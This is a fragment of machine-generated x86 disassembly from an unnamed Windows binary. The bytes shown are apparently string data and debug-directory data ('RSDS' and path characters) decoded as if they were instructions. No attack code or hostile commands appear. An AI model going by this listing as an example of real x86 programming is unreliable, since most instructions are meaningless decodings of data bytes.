  4338ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4338f2:	pop    edi
  4338f3:	cmp    BYTE PTR [edi+0x49],dl
  4338f6:	xor    eax,0x5700505f
  4338fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4338ff:	dec    esi
  433900:	dec    edx
  433901:	cmp    BYTE PTR [eax],al
  433903:	pop    edx
  433904:	dec    ebx
  433905:	xor    eax,0x4f5f3131
  43390a:	xor    dh,BYTE PTR [ecx]
  43390c:	pop    edi
  43390d:	inc    ebp
  43390e:	push   esp
  43390f:	inc    esp
  433910:	inc    ebp
  433911:	add    BYTE PTR [edi+0x55],dl
  433914:	cmp    DWORD PTR [edi+0x5a],ebx
  433917:	push   edx
  433918:	inc    edi
  433919:	xor    DWORD PTR [ebp+0x0],ecx
  43391c:	pop    edx
  43391d:	dec    ecx
  43391e:	dec    ebp
  43391f:	ss pop edi
  433921:	pop    edx
  433922:	push   edx
  433923:	cmp    BYTE PTR [esi+0x30],dl
  433926:	pop    edi
  433927:	push   ecx
  433928:	dec    esi
  433929:	add    BYTE PTR [ebx+0x32],dl
  43392c:	inc    ebx
  43392d:	cmp    BYTE PTR [edi+0x52],bl
  433930:	dec    ecx
  433931:	xor    BYTE PTR [eax],al
  433933:	inc    edi
  433934:	xor    eax,0x314f5f4b
  433939:	xor    DWORD PTR [edi+0x38],ebx
  43393c:	push   ebp
  43393d:	add    BYTE PTR [edi+0x4b],al
  433940:	xor    bl,BYTE PTR [edi+0x43]
  433943:	push   ebp
  433944:	cmp    DWORD PTR [ebp+0x4b],ecx
  433947:	ss pop edi
  433949:	pop    edx
  43394a:	push   edi
  43394b:	inc    esp
  43394c:	xor    BYTE PTR [eax],al
  43394e:	dec    ecx
  43394f:	inc    edi
  433950:	xor    eax,0x3058555f
  433955:	dec    ebx
  433956:	pop    edi
  433957:	push   edi
  433958:	add    BYTE PTR [eax+0x0],bl
  43395b:	inc    edi
  43395c:	add    BYTE PTR [edx+0x0],al
  43395f:	pop    edi
  433960:	add    BYTE PTR [ebx],dh
  433962:	add    BYTE PTR [eax],bh
  433964:	add    BYTE PTR [ebx+0x0],cl
  433967:	xor    eax,0x33003500
  43396c:	add    BYTE PTR [eax],dh
  43396e:	add    BYTE PTR [edi+0x0],bl
  433971:	push   esp
  433972:	add    BYTE PTR [ebp+0x0],cl
  433975:	xor    BYTE PTR [eax],al
  433977:	add    BYTE PTR [eax],al
  433979:	inc    esi
  43397a:	add    BYTE PTR [eax+0x0],bl
  43397d:	xor    BYTE PTR [eax],al
  43397f:	pop    edi
  433980:	add    BYTE PTR [ecx],dh
  433982:	add    BYTE PTR [ebx+0x0],al
  433985:	xor    eax,0x5f003100
  43398a:	add    BYTE PTR [ecx+0x0],al
  43398d:	xor    eax,DWORD PTR [eax]
  43398f:	add    BYTE PTR [eax],al
  433991:	push   ebx
  433992:	add    BYTE PTR [ebx+0x0],dl
  433995:	dec    eax
  433996:	add    BYTE PTR [edi+0x0],bl
  433999:	push   esp
  43399a:	add    BYTE PTR [ebx+0x0],al
  43399d:	push   ebx
  43399e:	add    BYTE PTR [edx+0x0],dl
  4339a1:	pop    edi
  4339a2:	add    BYTE PTR [ecx+0x0],dl
  4339a5:	dec    edi
  4339a6:	add    BYTE PTR [edi+0x0],al
  4339a9:	push   ecx
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	pop    ecx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],cl
  4339b3:	dec    edi
  4339b4:	add    BYTE PTR [ebp+0x0],dl
  4339b7:	cmp    DWORD PTR [eax],eax
  4339b9:	pop    edi
  4339ba:	add    BYTE PTR [edx],dh
  4339bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4339c0:	add    BYTE PTR ds:0x47005f00,dh
  4339c6:	add    BYTE PTR ds:0x48000000,dh
  4339cc:	add    BYTE PTR [edx+0x0],cl
  4339cf:	push   eax
  4339d0:	add    BYTE PTR [edi+0x0],bl
  4339d3:	cmp    BYTE PTR [eax],al
  4339d5:	add    BYTE PTR ss:0x55004100,dh
  4339dc:	add    BYTE PTR [edi+0x0],bl
  4339df:	push   edx
  4339e0:	add    BYTE PTR [edi],dh
  4339e2:	add    BYTE PTR [ecx+0x0],cl
  4339e5:	add    BYTE PTR [eax],al
  4339e7:	inc    esp
  4339e8:	add    BYTE PTR [ecx+0x0],dl
  4339eb:	inc    edx
  4339ec:	add    BYTE PTR [edi+0x0],bl
  4339ef:	push   ecx
  4339f0:	add    BYTE PTR [ecx+0x0],bl
  4339f3:	dec    edi
  4339f4:	add    BYTE PTR [eax+0x0],dl
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	dec    edx
  4339fa:	add    BYTE PTR [ecx+0x0],dl
  4339fd:	inc    esp
  4339fe:	add    BYTE PTR [edi+0x0],bl
  433a01:	dec    edx
  433a02:	add    BYTE PTR [eax],dh
  433a04:	add    BYTE PTR [ecx],dh
  433a06:	add    BYTE PTR [ebx+0x0],dl
  433a09:	push   ecx
  433a0a:	add    BYTE PTR [ecx],dh
  433a0c:	add    BYTE PTR [edi+0x0],bl
  433a0f:	push   edi
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    BYTE PTR [ebx+0x0],cl
  433a15:	pop    edx
  433a16:	add    BYTE PTR [esi],dh
  433a18:	add    BYTE PTR [edi+0x0],bl
  433a1b:	inc    ebx
  433a1c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433a20:	add    BYTE PTR [edi+0x0],bl
  433a23:	push   edi
  433a24:	add    BYTE PTR [ebx],dh
  433a26:	add    BYTE PTR [esi+0x0],cl
  433a29:	push   ebp
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	dec    edx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],dl
  433a33:	aaa    
  433a34:	add    BYTE PTR [eax],bh
  433a36:	add    BYTE PTR [edi+0x0],bl
  433a39:	pop    eax
  433a3a:	add    BYTE PTR [edi+0x0],cl
  433a3d:	inc    edi
  433a3e:	add    BYTE PTR [edi+0x0],bl
  433a41:	xor    al,0x0
  433a43:	push   eax
  433a44:	add    BYTE PTR [ecx+0x0],cl
  433a47:	push   ebp
  433a48:	add    BYTE PTR [eax],al
  433a4a:	add    BYTE PTR [edi+0x0],dl
  433a4d:	push   esp
  433a4e:	add    BYTE PTR [ebx+0x0],cl
  433a51:	add    BYTE PTR [eax],al
  433a53:	add    BYTE PTR [edx+0x53],dl
  433a56:	inc    esp
  433a57:	push   ebx
  433a58:	fld    DWORD PTR [edx+0xac8f98]
  433a5e:	enter  0x994c,0xfd
  433a62:	int    0xf
  433a64:	inc    edx
  433a65:	mov    ds:0x1b839e,al
  433a6a:	add    BYTE PTR [eax],al
  433a6c:	push   esp
  433a6d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433a71:	addr16 push edi
  433a73:	bound  bx,DWORD PTR [edx+0x45]
  433a77:	outs   dx,BYTE PTR ds:[esi]
  433a78:	pop    esp
  433a79:	je     0x433aee
  433a7b:	ja     0x433abe
  433a7d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a85:	js     0x433af6
  433a87:	jp     0x433af8
  433a89:	jns    0x433aef
  433a8b:	jp     0x433af5
  433a8d:	je     0x433af3
  433a8f:	jp     0x433af3
  433a91:	cs jo  0x433af8
  433a94:	bound  eax,QWORD PTR [eax]
	...
